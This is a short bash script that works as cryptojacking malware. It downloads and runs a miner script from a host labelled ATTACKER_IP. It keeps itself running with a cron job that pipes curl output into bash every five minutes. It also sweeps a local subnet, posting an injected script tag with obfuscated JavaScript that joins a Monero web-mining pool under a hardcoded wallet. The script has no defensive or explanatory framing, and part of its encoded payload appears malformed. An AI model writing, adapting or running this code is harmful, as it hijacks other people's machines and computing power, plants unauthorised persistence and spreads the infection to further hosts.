#!/bin/bash
# Configuration
ATTACKER_IP="10.0.0.242"
MINER_URL="http://$ATTACKER_IP:8080/miner.sh"

# Install miner via web injection
install_miner() {
    curl -s "$MINER_URL" -o /tmp/miner.sh
    chmod +x /tmp/miner.sh
    /tmp/miner.sh &
}

# Ensure persistence
ensure_persistence() {
    (crontab -l 2>/dev/null; echo "*/5 * * * * curl -s $MINER_URL | bash") | crontab -
}

# Network propagation
propagate() {
    for ip in $(seq 1 254); do
        target="10.0.0.$ip"
        curl -s --connect-timeout 1 "http://$target:80" -d "inject=<script>eval(atob('dmFyIHc9bmV3IFdlYlNvY2tldCgi'+btoa('wss://webminer.moneroocean.stream:443')+'\");w.onopen=function(){w.send(JSON.stringify({type:\"login\",params:{wallet:\"4ADHEMYrLqrHQvaQNVoKh28Vt6gttrckp2kfum6eYWK7FWbmRjFT7rzacpbr6MiXYMMBUxFcGpYor2i2jgQKTZiMZ4QwBjop9\",worker:\"m\"+Math.random().toString(36).slice(2),algo:\"cn-pico\",threads:-1}}));};'));</script>" &
    done
}

# Main execution
install_miner
ensure_persistence
propagate